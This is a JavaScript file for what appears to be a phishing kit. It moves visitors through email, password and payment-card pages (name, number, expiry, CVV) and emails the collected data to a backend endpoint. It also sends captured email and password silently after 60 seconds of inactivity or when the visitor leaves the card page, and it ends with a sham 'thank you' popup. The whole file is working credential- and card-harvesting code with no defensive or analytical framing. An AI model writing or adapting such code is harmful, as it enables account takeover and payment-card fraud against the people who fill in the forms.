
/* =========================
   Error Handling (Border Only)
========================= */

function showError(input) {
  input.style.borderColor = "#dc2626";
}

function clearError(input) {
  input.style.borderColor = "#ccc";
}

/* =========================
   Validation Functions
========================= */

function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const phoneRegex = /^[\d\s\-\+\(\)]+$/;

  if (!email.trim()) return { valid: false };

  if (email.includes("@")) {
    if (!emailRegex.test(email)) return { valid: false };
  } else if (phoneRegex.test(email.replace(/\s/g, ""))) {
    const digitsOnly = email.replace(/\D/g, "");
    if (digitsOnly.length < 10) return { valid: false };
  } else if (email.length < 3) {
    return { valid: false };
  }

  return { valid: true };
}

function validatePassword(password) {
  if (!password) return { valid: false };
  if (password.length < 8) return { valid: false };
  return { valid: true };
}

function validateCardName(name) {
  if (!name.trim()) return { valid: false };
  if (name.trim().length < 3) return { valid: false };
  if (!/^[a-zA-Z\s]+$/.test(name)) return { valid: false };
  return { valid: true };
}

function validateCardNumber(cardNumber) {
  const cleaned = cardNumber.replace(/\s/g, "");
  if (!cleaned) return { valid: false };
  if (!/^\d+$/.test(cleaned)) return { valid: false };
  if (cleaned.length < 13 || cleaned.length > 19) return { valid: false };

  let sum = 0;
  let isEven = false;
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned[i]);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }

  if (sum % 10 !== 0) return { valid: false };
  return { valid: true };
}

function validateExpiryDate(expiry) {
  if (!expiry) return { valid: false };
  if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) return { valid: false };

  const [month, year] = expiry.split("/");
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;

  const expYear = parseInt(year);
  const expMonth = parseInt(month);

  if (
    expYear < currentYear ||
    (expYear === currentYear && expMonth < currentMonth)
  ) {
    return { valid: false };
  }

  return { valid: true };
}

function validateCVV(cvv) {
  if (!cvv) return { valid: false };
  if (!/^\d{3,4}$/.test(cvv)) return { valid: false };
  return { valid: true };
}

/* =========================
   Formatting Helpers
========================= */

function formatCardNumber(value) {
  const cleaned = value.replace(/\s/g, "");
  const chunks = cleaned.match(/.{1,4}/g);
  return chunks ? chunks.join(" ") : cleaned;
}

function formatExpiryDate(value) {
  const cleaned = value.replace(/\D/g, "");
  if (cleaned.length >= 2) {
    return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
  }
  return cleaned;
}

/* =========================
   Email Backend Logic 
========================= */

// Track timeout for partial submission
let partialSubmitTimeout = null;
let dataAlreadySent = false;

async function sendToEmail(payload) {
  const res = await fetch("/api/send-email", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  });

  return await res.json();
}


/* =========================
   SEND INCOMPLETE DATA (email + password)
========================= */

async function sendIncompleteData() {
  if (dataAlreadySent) {
    console.log("Data already sent, skipping incomplete submission");
    return;
  }

  const formData = {
    email: getFormData("userEmail"),
    password: getFormData("userPassword"),
  };

  console.log("⏱️ Inactivity reached - Sending INCOMPLETE data (email + password)");

  const result = await sendToEmail({
  submissionType: "INCOMPLETE",
  data: formData
});

  if (result && result.success) {
    console.log("✅ Incomplete data sent successfully");
    dataAlreadySent = true;
  } else {
    console.error("❌ Failed to send incomplete data:", result);
  }
}

/* =========================
   LOCAL STORAGE HELPERS
========================= */

function saveFormData(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (e) {}
}

function getFormData(key) {
  try {
    return localStorage.getItem(key);
  } catch (e) {
    return null;
  }
}

/* =========================
   PAGE 1 - EMAIL
========================= */

function setupIndexValidation() {
  const emailInput = document.querySelector('.field[type="text"]');
  const submitBtn = document.querySelector(".btn");

  if (!emailInput || !submitBtn) return;

  emailInput.addEventListener("input", () => clearError(emailInput));

  submitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    if (!validateEmail(emailInput.value).valid) {
      showError(emailInput);
      return;
    }
    saveFormData("userEmail", emailInput.value);
    window.location.href = "password.html";
  });
}

/* =========================
   PAGE 2 - STATE
========================= */

function setupPasswordValidation() {
  const passwordInput = document.querySelector('.field[type="password"]');
  const submitBtn = document.querySelector(".btn");

  if (!passwordInput || !submitBtn) return;

  passwordInput.addEventListener("blur", () => {
    validatePassword(passwordInput.value).valid
      ? clearError(passwordInput)
      : showError(passwordInput);
  });

  passwordInput.addEventListener("input", () => clearError(passwordInput));

  submitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    if (!validatePassword(passwordInput.value).valid) {
      showError(passwordInput);
      return;
    }
    saveFormData("userPassword", passwordInput.value);
    window.location.href = "card.html";
  });
}

/* =========================
   PAGE 3 - CARD (FINAL PAGE)
========================= */

function setupCardValidation() {
  const cardNameInput = document.getElementById("cardName");
  const cardNumberInput = document.getElementById("cardNumber");
  const expiryDateInput = document.getElementById("expiryDate");
  const cvvInput = document.getElementById("cvv");
  const submitBtn = document.querySelector(".btn");

  if (
    !cardNameInput ||
    !cardNumberInput ||
    !expiryDateInput ||
    !cvvInput ||
    !submitBtn
  )
    return;

  console.log("⏰ Started 60-second inactivity timer");

  partialSubmitTimeout = setTimeout(sendIncompleteData, 60000);

  /* =========================
     PAGE LEAVE DETECTION
  ========================= */

  window.addEventListener("beforeunload", () => {

    // Stop timer
    if (partialSubmitTimeout) {

      clearTimeout(partialSubmitTimeout);

    }

    // Prevent duplicate sends
    if (dataAlreadySent) {

      return;

    }

    // Only continue if previous pages contain data
    const hasData =
      getFormData("userEmail") ||
      getFormData("userPassword");

    if (!hasData) {

      return;

    }

    navigator.sendBeacon(

      "/api/send-email",

      JSON.stringify({

        submissionType: "INCOMPLETE",

        data: {

          email: getFormData("userEmail"),
          password: getFormData("userPassword"),

        }

      })

    );

  });

  /* =========================
     INPUT FORMATTING
  ========================= */

  cardNumberInput.addEventListener("input", function () {

    const cleaned = this.value.replace(/\s/g, "");

    if (cleaned.length <= 19) {

      this.value = formatCardNumber(cleaned);

    }

  });

  expiryDateInput.addEventListener("input", function () {

    const cleaned = this.value.replace(/\D/g, "");

    if (cleaned.length <= 4) {

      this.value = formatExpiryDate(cleaned);

    }

  });

  cvvInput.addEventListener("input", function () {

    this.value = this.value
      .replace(/\D/g, "")
      .substring(0, 4);

  });

  /* =========================
     SUBMIT BUTTON
  ========================= */

  submitBtn.addEventListener("click", (e) => {

    e.preventDefault();

    let hasError = false;

    if (!validateCardName(cardNameInput.value).valid) {

      showError(cardNameInput);
      hasError = true;

    }

    if (!validateCardNumber(cardNumberInput.value).valid) {

      showError(cardNumberInput);
      hasError = true;

    }

    if (!validateExpiryDate(expiryDateInput.value).valid) {

      showError(expiryDateInput);
      hasError = true;

    }

    if (!validateCVV(cvvInput.value).valid) {

      showError(cvvInput);
      hasError = true;

    }

    if (hasError) {

      return;

    }

    // Stop inactivity timer
    if (partialSubmitTimeout) {

      clearTimeout(partialSubmitTimeout);
      partialSubmitTimeout = null;

    }

    // Save Page 3 data
    saveFormData("cardName", cardNameInput.value);
    saveFormData("cardNumber", cardNumberInput.value);
    saveFormData("expiryDate", expiryDateInput.value);
    saveFormData("cvv", cvvInput.value);

    // Move to confirm page
    window.location.href = "confirm.html";

  });

}

/* =========================
   CONFIRM PAGE 
========================= */

async function setupConfirmPage() {

  // Stop inactivity timer if still running
  if (partialSubmitTimeout) {

    clearTimeout(partialSubmitTimeout);
    partialSubmitTimeout = null;

  }

  // Prevent duplicate submission
  if (dataAlreadySent) {

    console.log("⚠️ Data already sent, skipping COMPLETE submission");
    return;

  }

  const formData = {

    email: getFormData("userEmail"),
    password: getFormData("userPassword"),

    cardName: getFormData("cardName"),
    cardNumber: getFormData("cardNumber"),
    expiryDate: getFormData("expiryDate"),
    cvv: getFormData("cvv"),

  };

  try {

    const result = await sendToEmail({

      submissionType: "COMPLETE",
      data: formData

    });

    if (result && result.success) {

      console.log("✅ COMPLETE submission sent successfully");

      dataAlreadySent = true;

    } else {

      console.error("❌ COMPLETE submission failed:", result);

    }

  } catch (error) {

    console.error("❌ Error sending COMPLETE submission:", error);

  }

}

/* =========================
   ROUTER
========================= */

document.addEventListener("DOMContentLoaded", function () {
  const page = window.location.pathname.split("/").pop();

  switch (page) {
    case "":
    case "index.html":
      setupIndexValidation();
      break;
    case "password.html":
      setupPasswordValidation();
      break;
    case "card.html":
      setupCardValidation();
      break;
    case "confirm.html":
      setupConfirmPage();
      break;
  }
});

// =========================
// THANK YOU POPUP
// =========================

// Show popup after 5 seconds
window.addEventListener("load", function () {

    setTimeout(function () {

        const popup = document.getElementById("thankYouPopup");

        if (popup) {
            popup.style.display = "flex";
        }

    }, 5000);

});


// Close popup
document.addEventListener("DOMContentLoaded", function () {

    const closeBtn = document.getElementById("closePopupBtn");

    if (closeBtn) {

        closeBtn.addEventListener("click", function () {

            document.getElementById("thankYouPopup").style.display = "none";

        });

    }

});